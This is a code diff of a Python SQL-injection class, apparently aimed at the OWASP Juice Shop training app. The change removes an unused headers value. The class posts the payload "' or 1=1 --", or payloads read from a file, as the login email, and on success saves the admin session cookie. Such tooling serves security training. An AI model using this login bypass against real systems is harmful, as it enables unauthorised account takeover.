@@ -8,13 +8,11 @@ class SQL_injector(a.attack_inter):
 
     def generator(self, myScript):
         #cookies = COOKIE
-        headers = a.HEADER
-
         json_data = {
             'email': myScript,
             'password': '123',
         }
-        return headers, json_data
+        return  json_data
 
     def run(self, userInput = '\' or 1=1 --', username = 'admin'):
         # [-4:]
@@ -22,7 +20,7 @@ class SQL_injector(a.attack_inter):
             f = open(userInput, "r")
             for line in f:
                 line = line.rstrip()
-                headers, json_data = self.generator(line)
+                json_data = self.generator(line)
                 response = self.juice_session.post(self.url, json=json_data, verify=False)
                 print(response.status_code)
                 if response.status_code == 200:
@@ -31,7 +29,7 @@ class SQL_injector(a.attack_inter):
                     a.auth_write('admin',newCookie,newHeader)
                     break
         else:
-            headers, json_data = self.generator(userInput)
+            json_data = self.generator(userInput)
             response = self.juice_session.post(self.url, json=json_data)
             print(response.status_code)
             if response.status_code == 200:
